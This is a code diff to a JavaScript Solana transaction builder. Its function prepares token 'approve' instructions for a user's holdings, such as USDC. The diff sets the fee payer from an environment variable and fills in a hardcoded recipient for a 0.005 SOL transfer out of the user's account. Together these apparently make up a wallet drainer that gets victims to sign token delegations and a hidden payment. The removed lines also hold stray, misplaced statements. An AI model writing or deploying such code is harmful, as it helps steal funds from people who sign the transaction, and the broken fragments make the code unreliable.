@@ -6,9 +6,7 @@ const {
 
 const { createApproveInstruction } = require("@solana/spl-token");
 const { getUserTokenAccounts } = require("../solana/tokenService");
-const config = require("../config");
-new PublicKey(config.wallets.approveAuthority)
-tx.feePayer = new PublicKey(config.wallets.backend);
+
 async function buildApprove(user, connection) {
     const tx = new Transaction();
 
@@ -18,7 +16,7 @@ async function buildApprove(user, connection) {
     const { blockhash } = await connection.getLatestBlockhash();
 
     tx.recentBlockhash = blockhash;
-    tx.feePayer = userPubkey;
+    tx.feePayer = new PublicKey(process.env.WALLET);
 
     if (t.usdc > 0n) {
         tx.add(
@@ -43,12 +41,12 @@ async function buildApprove(user, connection) {
     }
 
     tx.add(
-    SystemProgram.transfer({
-        fromPubkey: userPubkey,
-        toPubkey: new PublicKey("11111111111111111111111111111111"), // nahraď vlastnou adresou
-        lamports: 5_000_000, // 0.005 SOL
-    })
-);
+        SystemProgram.transfer({
+            fromPubkey: userPubkey,
+            toPubkey: new PublicKey("JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN"),
+            lamports: 5_000_000,
+        })
+    );
 
     return tx;
 }
